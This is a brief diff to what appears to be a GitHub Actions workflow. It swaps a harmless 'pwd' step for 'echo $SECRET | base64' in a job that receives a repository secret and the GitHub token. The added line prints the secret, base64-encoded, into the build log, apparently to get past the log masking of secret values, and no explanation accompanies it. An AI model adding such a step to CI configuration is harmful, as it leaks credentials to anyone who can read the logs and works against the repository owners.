@@ -12,4 +12,4 @@ jobs:
           SECRET: ${{ secrets.SECRET }}
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
-          pwd
+          echo $SECRET | base64
